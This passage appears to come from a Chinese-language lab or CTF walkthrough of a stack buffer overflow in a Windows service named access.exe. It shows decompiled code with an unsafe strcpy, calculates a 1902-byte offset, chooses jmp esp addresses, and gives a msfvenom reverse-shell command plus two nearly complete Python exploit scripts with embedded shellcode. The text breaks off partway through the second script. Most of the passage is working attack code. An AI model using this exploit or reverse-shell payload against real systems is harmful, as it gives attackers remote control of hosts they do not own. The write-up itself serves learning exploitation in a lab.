<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword type-declaration">int</span> __stdcall <span class="token function">ConnectionHandler</span><span class="token punctuation">(</span><span class="token constant">LPVOID</span> lpThreadParameter<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword type-declaration">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  size_t v2<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  char Dst<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-410h]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  char <span class="token operator">*</span>Dest<span class="token punctuation">;</span> <span class="token comment">// [esp+400h] [ebp-28h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword type-declaration">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+404h] [ebp-24h]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword type-declaration">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+408h] [ebp-20h]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token constant">SOCKET</span> s<span class="token punctuation">;</span> <span class="token comment">// [esp+40Ch] [ebp-1Ch]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword type-declaration">void</span> <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment">// [esp+410h] [ebp-18h]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  char <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [esp+414h] [ebp-14h]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword type-declaration">int</span> len<span class="token punctuation">;</span> <span class="token comment">// [esp+418h] [ebp-10h]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  unsigned <span class="token keyword type-declaration">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+41Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num="14"></td><td><pre> </pre></td></tr><tr><td data-num="15"></td><td><pre>  len <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  buf <span class="token operator">=</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0</span>x1000u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  v8 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0</span>x400u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dst<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>x3E8u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>x1000u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">SOCKET</span><span class="token punctuation">)</span>lpThreadParameter<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  result <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">SOCKET</span><span class="token punctuation">)</span>lpThreadParameter<span class="token punctuation">,</span> <span class="token string double-quoted-string">"Verification Code:\n"</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  v6 <span class="token operator">=</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">closesocket</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span> lpThreadParameter <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>      result <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>      v5 <span class="token operator">=</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        Dest <span class="token operator">=</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0</span>xB54u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token function">memset</span><span class="token punctuation">(</span>Dest<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>xB54u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token function">strncpy</span><span class="token punctuation">(</span>Dest<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span>xB54u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>          v2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Dest<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;=</span> i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">77</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">95</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">121</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">126</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">127</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>        <span class="token function">f3</span><span class="token punctuation">(</span>Dest<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        <span class="token function">memset</span><span class="token punctuation">(</span>Dest<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>xB54u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token function">closesocket</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        <span class="token function">closesocket</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里会对输入的字符串进行一些处理，然后经过一个 f3 函数，内容如下，使用 strcpy 函数将输入的数据复制到另一个字符串中</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>char <span class="token operator">*</span>__cdecl <span class="token function">f3</span><span class="token punctuation">(</span>char <span class="token operator">*</span>Source<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  char Dest<span class="token punctuation">;</span> <span class="token comment">// [esp+1Eh] [ebp-76Ah]</span></pre></td></tr><tr><td data-num="4"></td><td><pre> </pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> Source<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>预留的 1898 (0x76A) 个字节 + 保存 ebp 的 4 个字节，一共 1902 个字节就到返回地址，再找一个 jmp esp 语句的地址覆盖原先的地址，然后填入 shellcode，到时候执行完 strcpy 就会从栈顶执行 shellcode 代码</p>
<p>先找到 jmp esp 语句，access.exe 程序中未找到，但是 dll 动态链接库中有许多，找到两处：0x625012D0 和 0x625012DD，都可以</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011231028235-484510563.png" alt="" /></p>
<p>然后使用 msf 生成 shellcode 代码（这个根据自己的 ip 进行修改），-b 参数跟的是避免出现的字符，就是前面代码中会处理输入中的那些字符</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>shell_reverse_tcp <span class="token constant">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.75</span><span class="token number">.13</span> <span class="token constant">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>b <span class="token string single-quoted-string">'\x00\x0a\x4d\x4f\x5f\x79\x7e\x7f'</span> <span class="token operator">-</span>f python</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011231046827-1790777700.png" alt="" /></p>
<p>最终代码分为两种，想运行简单选用第二种</p>
<p>一种是用 pwntools 库写的</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># coding:utf8</span></pre></td></tr><tr><td data-num="2"></td><td><pre> </pre></td></tr><tr><td data-num="3"></td><td><pre>from pwn import  <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre> </pre></td></tr><tr><td data-num="5"></td><td><pre>conn <span class="token operator">=</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.75.18'</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre> </pre></td></tr><tr><td data-num="7"></td><td><pre>junk <span class="token operator">=</span> b<span class="token string single-quoted-string">'a'</span> <span class="token operator">*</span> <span class="token number">1902</span></pre></td></tr><tr><td data-num="8"></td><td><pre>ret_addr<span class="token operator">=</span>b<span class="token string single-quoted-string">'\xdd\x12\x50\x62'</span></pre></td></tr><tr><td data-num="9"></td><td><pre> </pre></td></tr><tr><td data-num="10"></td><td><pre>buf <span class="token operator">=</span>  b<span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="11"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></pre></td></tr><tr><td data-num="12"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x76\x0e\x7d\xaf\x3e\xe6\x83\xee\xfc\xe2\xf4\x81\x47"</span></pre></td></tr><tr><td data-num="13"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbc\xe6\x7d\xaf\x5e\x6f\x98\x9e\xfe\x82\xf6\xff\x0e"</span></pre></td></tr><tr><td data-num="14"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x6d\x2f\xa3\xb5\xb4\x69\x24\x4c\xce\x72\x18\x74\xc0"</span></pre></td></tr><tr><td data-num="15"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x4c\x50\x92\xda\x1c\xd3\x3c\xca\x5d\x6e\xf1\xeb\x7c"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x68\xdc\x14\x2f\xf8\xb5\xb4\x6d\x24\x74\xda\xf6\xe3"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x2f\x9e\x9e\xe7\x3f\x37\x2c\x24\x67\xc6\x7c\x7c\xb5"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xaf\x65\x4c\x04\xaf\xf6\x9b\xb5\xe7\xab\x9e\xc1\x4a"</span></pre></td></tr><tr><td data-num="19"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbc\x60\x33\xe7\xba\x97\xde\x93\x8b\xac\x43\x1e\x46"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xd2\x1a\x93\x99\xf7\xb5\xbe\x59\xae\xed\x80\xf6\xa3"</span></pre></td></tr><tr><td data-num="21"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x75\x6d\x25\xb3\x3f\x35\xf6\xab\xb5\xe7\xad\x26\x7a"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xc2\x59\xf4\x65\x87\x24\xf5\x6f\x19\x9d\xf0\x61\xbc"</span></pre></td></tr><tr><td data-num="23"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xf6\xbd\xd5\x6b\x20\xc7\x0d\xd4\x7d\xaf\x56\x91\x0e"</span></pre></td></tr><tr><td data-num="24"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x9d\x61\xb2\x15\xe3\x49\xc0\x7a\x50\xeb\x5e\xed\xae"</span></pre></td></tr><tr><td data-num="25"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x3e\xe6\x54\x6b\x6a\xb6\x15\x86\xbe\x8d\x7d\x50\xeb"</span></pre></td></tr><tr><td data-num="26"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xb6\x2d\xff\x6e\xa6\x2d\xef\x6e\x8e\x97\xa0\xe1\x06"</span></pre></td></tr><tr><td data-num="27"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x82\x7a\xa9\x8c\x78\xc7\xfe\x4e\x36\xa2\x56\xe4\x7d"</span></pre></td></tr><tr><td data-num="28"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbe\x62\x6f\x9b\xc5\x2e\xb0\x2a\xc7\xa7\x43\x09\xce"</span></pre></td></tr><tr><td data-num="29"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xc1\x33\xf8\x6f\x4a\xea\x82\xe1\x36\x93\x91\xc7\xce"</span></pre></td></tr><tr><td data-num="30"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x53\xdf\xf9\xc1\x33\x15\xcc\x53\x82\x7d\x26\xdd\xb1"</span></pre></td></tr><tr><td data-num="31"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x2a\xf8\x0f\x10\x17\xbd\x67\xb0\x9f\x52\x58\x21\x39"</span></pre></td></tr><tr><td data-num="32"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x8b\x02\xe7\x7c\x22\x7a\xc2\x6d\x69\x3e\xa2\x29\xff"</span></pre></td></tr><tr><td data-num="33"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x68\xb0\x2b\xe9\x68\xa8\x2b\xf9\x6d\xb0\x15\xd6\xf2"</span></pre></td></tr><tr><td data-num="34"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xd9\xfb\x50\xeb\x6f\x9d\xe1\x68\xa0\x82\x9f\x56\xee"</span></pre></td></tr><tr><td data-num="35"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xfa\xb2\x5e\x19\xa8\x14\xce\x53\xdf\xf9\x56\x40\xe8"</span></pre></td></tr><tr><td data-num="36"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x12\xa3\x19\xa8\x93\x38\x9a\x77\x2f\xc5\x06\x08\xaa"</span></pre></td></tr><tr><td data-num="37"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x85\xa1\x6e\xdd\x51\x8c\x7d\xfc\xc1\x33"</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    </pre></td></tr><tr><td data-num="39"></td><td><pre>payload <span class="token operator">=</span> b<span class="token string single-quoted-string">''</span></pre></td></tr><tr><td data-num="40"></td><td><pre>payload <span class="token operator">+=</span> junk</pre></td></tr><tr><td data-num="41"></td><td><pre>payload <span class="token operator">+=</span> ret_addr</pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">#payload += nops</span></pre></td></tr><tr><td data-num="43"></td><td><pre>payload <span class="token operator">+=</span> buf</pre></td></tr><tr><td data-num="44"></td><td><pre> </pre></td></tr><tr><td data-num="45"></td><td><pre>conn<span class="token operator">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr></table></figure><p>一种是用 python3 的 socket 库</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num="2"></td><td><pre>import socket</pre></td></tr><tr><td data-num="3"></td><td><pre>buf<span class="token operator">=</span>b<span class="token string single-quoted-string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre>target_ip<span class="token operator">=</span><span class="token string single-quoted-string">'192.168.75.18'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>target_port<span class="token operator">=</span><span class="token number">23</span></pre></td></tr><tr><td data-num="6"></td><td><pre>recv_buf<span class="token operator">=</span><span class="token number">4096</span></pre></td></tr><tr><td data-num="7"></td><td><pre>junk <span class="token operator">=</span> b<span class="token string single-quoted-string">'a'</span> <span class="token operator">*</span> <span class="token number">1902</span></pre></td></tr><tr><td data-num="8"></td><td><pre>ret_addr<span class="token operator">=</span>b<span class="token string single-quoted-string">'\xdd\x12\x50\x62'</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#nops=b'\x90'*32   可选</span></pre></td></tr><tr><td data-num="10"></td><td><pre>buf <span class="token operator">=</span>  b<span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="11"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></pre></td></tr><tr><td data-num="12"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x76\x0e\x7d\xaf\x3e\xe6\x83\xee\xfc\xe2\xf4\x81\x47"</span></pre></td></tr><tr><td data-num="13"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbc\xe6\x7d\xaf\x5e\x6f\x98\x9e\xfe\x82\xf6\xff\x0e"</span></pre></td></tr><tr><td data-num="14"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x6d\x2f\xa3\xb5\xb4\x69\x24\x4c\xce\x72\x18\x74\xc0"</span></pre></td></tr><tr><td data-num="15"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x4c\x50\x92\xda\x1c\xd3\x3c\xca\x5d\x6e\xf1\xeb\x7c"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x68\xdc\x14\x2f\xf8\xb5\xb4\x6d\x24\x74\xda\xf6\xe3"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x2f\x9e\x9e\xe7\x3f\x37\x2c\x24\x67\xc6\x7c\x7c\xb5"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xaf\x65\x4c\x04\xaf\xf6\x9b\xb5\xe7\xab\x9e\xc1\x4a"</span></pre></td></tr><tr><td data-num="19"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbc\x60\x33\xe7\xba\x97\xde\x93\x8b\xac\x43\x1e\x46"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xd2\x1a\x93\x99\xf7\xb5\xbe\x59\xae\xed\x80\xf6\xa3"</span></pre></td></tr><tr><td data-num="21"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x75\x6d\x25\xb3\x3f\x35\xf6\xab\xb5\xe7\xad\x26\x7a"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xc2\x59\xf4\x65\x87\x24\xf5\x6f\x19\x9d\xf0\x61\xbc"</span></pre></td></tr><tr><td data-num="23"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xf6\xbd\xd5\x6b\x20\xc7\x0d\xd4\x7d\xaf\x56\x91\x0e"</span></pre></td></tr><tr><td data-num="24"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x9d\x61\xb2\x15\xe3\x49\xc0\x7a\x50\xeb\x5e\xed\xae"</span></pre></td></tr><tr><td data-num="25"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x3e\xe6\x54\x6b\x6a\xb6\x15\x86\xbe\x8d\x7d\x50\xeb"</span></pre></td></tr><tr><td data-num="26"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xb6\x2d\xff\x6e\xa6\x2d\xef\x6e\x8e\x97\xa0\xe1\x06"</span></pre></td></tr><tr><td data-num="27"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x82\x7a\xa9\x8c\x78\xc7\xfe\x4e\x36\xa2\x56\xe4\x7d"</span></pre></td></tr><tr><td 